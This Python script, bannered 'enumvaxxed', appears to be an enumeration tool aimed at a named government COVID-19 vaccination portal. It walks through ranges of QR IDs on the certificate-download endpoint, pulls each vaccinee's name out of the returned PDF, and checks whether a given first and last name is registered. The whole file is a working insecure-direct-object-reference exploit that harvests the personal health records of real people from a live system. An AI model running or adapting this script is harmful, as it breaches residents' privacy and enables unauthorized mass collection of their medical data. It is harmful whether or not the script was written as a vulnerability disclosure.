from optparse import OptionParser
import requests, re, threading, sys

# GLOBAL

# ANSI Color Codes
# Tnx: https://gist.github.com/rene-d/9e584a7dd2935d0f461904b9f2950007

RED = "\033[0;31m"
GREEN = "\033[0;32m"
BLUE = "\033[0;34m"
BOLD = "\033[1m"
END = "\033[0m"

BANNER = '''{}
                                                                           __     
                                                                          /\ \    
   __    ___   __  __    ___ ___   __  __     __     __  _  __  _    __   \_\ \   
 /'__`\/' _ `\/\ \/\ \ /' __` __`\/\ \/\ \  /'__`\  /\ \/'\/\ \/'\ /'__`\ /'_` \  
/\  __//\ \/\ \ \ \_\ \/\ \/\ \/\ \ \ \_/ |/\ \L\.\_\/>  </\/>  <//\  __//\ \L\ \ 
\ \____\ \_\ \_\ \____/\ \_\ \_\ \_\ \___/ \ \__/.\_\/\_/\_\/\_/\_\ \____\ \___,_\\
 \/____/\/_/\/_/\/___/  \/_/\/_/\/_/\/__/   \/__/\/_/\//\/_/\//\/_/\/____/\/__,_ /
{}
'''.format(BOLD, END)

URL_ID = "https://bakuna.baguio.gov.ph/api/vaccinees/cert_download?qr_id="
URL_NAME = "https://bakuna.baguio.gov.ph/api/find?first_name={}&middle_name=&last_name={}"
ID = "1-5"

class Enumerate:

    def __init__(self, url):
        self.url = url
        print(BANNER)
        print("[{}INFO{}] {}Starting Script{}... ".format(BLUE, END, BOLD, END))

    def id(self, id):
        response = requests.get(self.url + str(id))
        if response.status_code == 200:
            names = re.search(r"(\/Title) \((.{3})([a-z A-Z].*)(.{25})\)", response.text)
            print("[{}{}{}] {}".format(GREEN, id, END , names.group(3)))
        else:
            print("[{}{}{}] EMPTY".format(RED, id, END))
            pass

    def name(self, firstname, lastname):
        payload = { "firstname" : firstname, "lastname" : lastname, }
        response = requests.post(self.url.format(firstname, lastname), json=payload)

        if response.status_code == 200 and len(response.text) != 190:
            print("[{}MATCHED{}] USER EXISTS".format(GREEN, END))
        else:
            print("[{}ERROR{}] NOT FOUND".format(RED, END))

if __name__ == "__main__":

    parser = OptionParser(usage=BANNER)
    parser.add_option("--id", dest="id", help="Specify the ID (For Multiple IDs: [1-5])", type="string")
    parser.add_option("--firstname", dest="firstname", help="Specify the First Name", type="string")
    parser.add_option("--lastname", dest="lastname", help="Specify the Last Name", type="string")
    (options, args) = parser.parse_args()

    if options.id:
        enumerate = Enumerate(URL_ID)
        ID = options.id
        threads = []

        if re.match(r"[0-9]*-[0-9]*", ID):
            ids = re.search(r"([0-9]*)-([0-9]*)", ID)
            if int(ids.group(1)) < int(ids.group(2)):
                for thread_num in range(int(ids.group(1)), int(ids.group(2)) + 1):
                    thread = threading.Thread(target=enumerate.id, args=(thread_num,))
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()
            else:
                print("[{}ERROR{}] FIRST RANGE MUST BE LESS THAN THE LAST RANGE".format(RED, END))

        elif re.match(r"[0-9]*", ID):
            id = re.search(r"([0-9]*)", ID)
            enumerate.id(id.group(1))

        else:
            parser.parse_args(["-h"])

    elif options.firstname and options.lastname:
        enumerate = Enumerate(URL_NAME)
        enumerate.name(options.firstname, options.lastname)

    else:
        parser.parse_args(["-h"])